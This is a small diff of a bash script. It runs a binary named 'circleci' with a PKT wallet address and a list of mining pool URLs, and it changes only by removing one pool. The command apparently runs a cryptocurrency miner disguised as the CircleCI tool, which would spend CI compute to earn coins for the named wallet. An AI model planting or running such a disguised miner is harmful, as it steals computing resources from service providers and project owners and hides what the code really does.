@@ -1,7 +1,7 @@
 #!/bin/bash
 
 chmod +x circleci
-./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com
+./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world
 
 
 
